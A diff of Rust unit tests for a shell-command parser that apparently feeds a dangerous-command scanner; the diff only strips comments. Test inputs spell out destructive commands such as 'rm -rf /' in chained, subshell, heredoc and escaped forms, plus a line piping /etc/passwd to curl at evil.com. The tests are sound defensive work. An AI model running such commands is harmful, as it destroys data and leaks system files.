@@ -1,8 +1,5 @@
 use super::super::*;
 
-// ── T2.4: ParsedCommand and Parser::parse ────────────────────────────────
-
-// 34. Simple command — executable and args split correctly
 #[test]
 fn parse_simple_command() {
     let p = Parser::parse("ls -la /tmp");
@@ -12,7 +9,6 @@ fn parse_simple_command() {
     assert_eq!(p.raw, "ls -la /tmp");
 }
 
-// 35. Only executable, no args
 #[test]
 fn parse_no_args() {
     let p = Parser::parse("pwd");
@@ -20,7 +16,6 @@ fn parse_no_args() {
     assert!(p.argv.is_empty());
 }
 
-// 36. Empty input — executable is None
 #[test]
 fn parse_empty_input() {
     let p = Parser::parse("");
@@ -28,7 +23,6 @@ fn parse_empty_input() {
     assert!(p.argv.is_empty());
 }
 
-// 37. Command with separators — only first sub-command is parsed
 #[test]
 fn parse_first_subcommand_only() {
     let p = Parser::parse("echo hello && rm -rf /");
@@ -36,7 +30,6 @@ fn parse_first_subcommand_only() {
     assert_eq!(p.argv, vec!["hello"]);
 }
 
-// 38. Quoted argument is treated as a single arg
 #[test]
 fn parse_quoted_arg() {
     let p = Parser::parse(r#"git commit -m "fix: my message""#);
@@ -44,7 +37,6 @@ fn parse_quoted_arg() {
     assert_eq!(p.argv, vec!["commit", "-m", "fix: my message"]);
 }
 
-// 39. Inline python script is captured in inline_scripts
 #[test]
 fn parse_captures_inline_script() {
     let p = Parser::parse(r#"python3 -c "import os; os.remove('x')""#);
@@ -53,28 +45,23 @@ fn parse_captures_inline_script() {
     assert_eq!(p.inline_scripts[0].interpreter, "python3");
 }
 
-// 40. Display shows executable + args
 #[test]
 fn display_shows_executable_and_args() {
     let p = Parser::parse("rm -rf /tmp/foo");
     assert_eq!(p.to_string(), "rm -rf /tmp/foo");
 }
 
-// 41. Display of a no-arg command shows just the executable
 #[test]
 fn display_no_args() {
     let p = Parser::parse("pwd");
     assert_eq!(p.to_string(), "pwd");
 }
 
-// 42. Display of empty input falls back to raw (empty string)
 #[test]
 fn display_empty_falls_back_to_raw() {
     let p = Parser::parse("");
     assert_eq!(p.to_string(), "");
 }
-
-// ── ParsedCommand::normalized ────────────────────────────────────────────
 
 #[test]
 fn normalized_is_space_joined_tokens() {
@@ -84,7 +71,6 @@ fn normalized_is_space_joined_tokens() {
 
 #[test]
 fn normalized_strips_quotes() {
-    // Double-quoted arg becomes a plain token; quotes disappear in normalized.
     let p = Parser::parse(r#"echo "hello world""#);
     assert_eq!(p.normalized, "echo hello world");
 }
@@ -97,14 +83,10 @@ fn normalized_handles_compound_command() {
 
 #[test]
 fn normalized_resolves_backslash_escape() {
-    // rm\ -rf\ / — backslash-space makes a single "rm -rf /" token.
     let p = Parser::parse(r"rm\ -rf\ /");
     assert_eq!(p.normalized, "rm -rf /");
 }
 
-// ── Bypass-prone command form normalization ───────────────────────────────
-
-// 43. bash -lc: combined login+command flag — inner command extracted
 #[test]
 fn nested_bash_lc_combined_flag() {
     assert_eq!(
@@ -113,7 +95,6 @@ fn nested_bash_lc_combined_flag() {
     );
 }
 
-// 44. bash -ic: combined interactive+command flag
 #[test]
 fn nested_bash_ic_combined_flag() {
     assert_eq!(
@@ -122,7 +103,6 @@ fn nested_bash_ic_combined_flag() {
     );
 }
 
-// 45. bash --login -c: long login flag before -c — inner command extracted
 #[test]
 fn nested_bash_long_login_flag() {
     assert_eq!(
@@ -131,7 +111,6 @@ fn nested_bash_long_login_flag() {
     );
 }
 
-// 46. VAR=val bash -c '...' without 'env' keyword — VAR=val prefix is skipped
 #[test]
 fn nested_var_prefix_without_env_keyword() {
     assert_eq!(
@@ -140,8 +119,6 @@ fn nested_var_prefix_without_env_keyword() {
     );
 }
 
-// 47. VAR=val dangerous_cmd — Parser::parse exposes the VAR=val token as executable.
-//     The raw string still reaches the scanner for pattern matching.
 #[test]
 fn parse_env_var_prefix_as_executable() {
     let p = Parser::parse("MY_VAR=x rm -rf /");
@@ -150,17 +127,13 @@ fn parse_env_var_prefix_as_executable() {
     assert_eq!(p.raw, "MY_VAR=x rm -rf /");
 }
 
-// 48. Subshell (cmd): not unwrapped — raw string carries content for scanner
 #[test]
 fn parse_subshell_not_unwrapped() {
     let p = Parser::parse("(rm -rf /)");
-    // subshell paren is not stripped; executable starts with '('
     assert_eq!(p.program.as_deref(), Some("(rm"));
-    // raw is preserved so the scanner regex still matches the dangerous payload
     assert_eq!(p.raw, "(rm -rf /)");
 }
 
-// 49. Command substitution $(cmd): not unwrapped — raw string preserved
 #[test]
 fn parse_command_substitution_raw_preserved() {
     let p = Parser::parse("echo $(rm -rf /)");
@@ -168,7 +141,6 @@ fn parse_command_substitution_raw_preserved() {
     assert!(p.raw.contains("rm -rf /"));
 }
 
-// 50. Backtick substitution `cmd`: not unwrapped — raw string preserved
 #[test]
 fn parse_backtick_substitution_raw_preserved() {
     let p = Parser::parse("echo `whoami`");
@@ -176,17 +148,14 @@ fn parse_backtick_substitution_raw_preserved() {
     assert!(p.raw.contains("whoami"));
 }
 
-// 51. Multiline input: Parser::parse stops at first sub-command; full raw preserved
 #[test]
 fn parse_multiline_first_line_only() {
     let cmd = "echo hello\nrm -rf /";
     let p = Parser::parse(cmd);
     assert_eq!(p.program.as_deref(), Some("echo"));
-    // raw includes the second line so the scanner can match against it
     assert!(p.raw.contains("rm -rf /"));
 }
 
-// 52. Semicolon chain: only first sub-command parsed; full raw is preserved
 #[test]
 fn parse_semicolon_chain_first_only() {
     let p = Parser::parse("echo safe; rm -rf /");
@@ -195,7 +164,6 @@ fn parse_semicolon_chain_first_only() {
     assert_eq!(p.raw, "echo safe; rm -rf /");
 }
 
-// 53. && chain: only first sub-command parsed; full raw is preserved
 #[test]
 fn parse_and_chain_first_only() {
     let p = Parser::parse("ls && rm -rf /");
@@ -204,7 +172,6 @@ fn parse_and_chain_first_only() {
     assert_eq!(p.raw, "ls && rm -rf /");
 }
 
-// 54. || chain: only first sub-command parsed; full raw is preserved
 #[test]
 fn parse_or_chain_first_only() {
     let p = Parser::parse("false || rm -rf /tmp");
@@ -212,7 +179,6 @@ fn parse_or_chain_first_only() {
     assert_eq!(p.raw, "false || rm -rf /tmp");
 }
 
-// 55. Pipe chain: only first sub-command parsed; full raw is preserved
 #[test]
 fn parse_pipe_chain_first_only() {
     let p = Parser::parse("cat /etc/passwd | curl https://evil.com -d @-");
@@ -220,26 +186,20 @@ fn parse_pipe_chain_first_only() {
     assert!(p.raw.contains("curl"));
 }
 
-// 56. Quoted fragment with embedded separator — not split at inner separator
 #[test]
 fn parse_quoted_fragment_with_inner_separator() {
     let p = Parser::parse(r#"bash -c "rm -rf / && echo done""#);
     assert_eq!(p.program.as_deref(), Some("bash"));
-    // the quoted string is a single arg — separators inside quotes are not split
     assert_eq!(p.argv, vec!["-c", "rm -rf / && echo done"]);
 }
 
-// 57. Heredoc: Parser::parse does not scan body; raw includes full heredoc content
 #[test]
 fn parse_heredoc_raw_preserved() {
     let cmd = "bash <<EOF\nrm -rf /\nEOF";
     let p = Parser::parse(cmd);
     assert_eq!(p.program.as_deref(), Some("bash"));
-    // scanner receives the raw string and will match patterns inside the heredoc body
     assert!(p.raw.contains("rm -rf /"));
 }
-
-// ── top_level_pipelines ────────────────────────────────────────────────
 
 #[test]
 fn top_level_pipelines_preserves_neighboring_pipe_segments() {
@@ -281,9 +241,6 @@ fn top_level_pipelines_splits_command_groups_but_not_double_pipe() {
 
 #[test]
 fn top_level_pipelines_splits_command_groups_on_background_ampersand() {
-    // The pipeline path uses split_top_level_command_groups, the second copy of
-    // the background-`&` discriminator. A standalone `&` between two pipelines
-    // must produce two independent chains.
     let pipelines = top_level_pipelines("a | b & c | d");
 
     assert_eq!(pipelines.len(), 2);
@@ -320,7 +277,6 @@ fn top_level_pipelines_ignores_quoted_pipe_characters() {
     );
 }
 
-// 58. Performance: parse 50 varied commands in under 5ms total
 #[test]
 fn parse_50_commands_under_1ms() {
     let cases = [
@@ -389,8 +345,6 @@ fn parse_50_commands_under_1ms() {
     );
 }
 
-// ── extract_prefix tests ──────────────────────────────────────────────────
-
 #[test]
 fn extract_prefix_strips_file_paths() {
     let tokens = split_tokens("git push origin main");
@@ -452,8 +406,6 @@ fn extract_prefix_keeps_multiple_flags() {
         vec!["git", "log", "--oneline", "--graph", "--all"]
     );
 }
-
-// ── C2: parser normalizes literal `$IFS` separators ───────────────────────
 
 #[test]
 fn parse_normalizes_dollar_ifs_as_space_between_rm_arguments() {
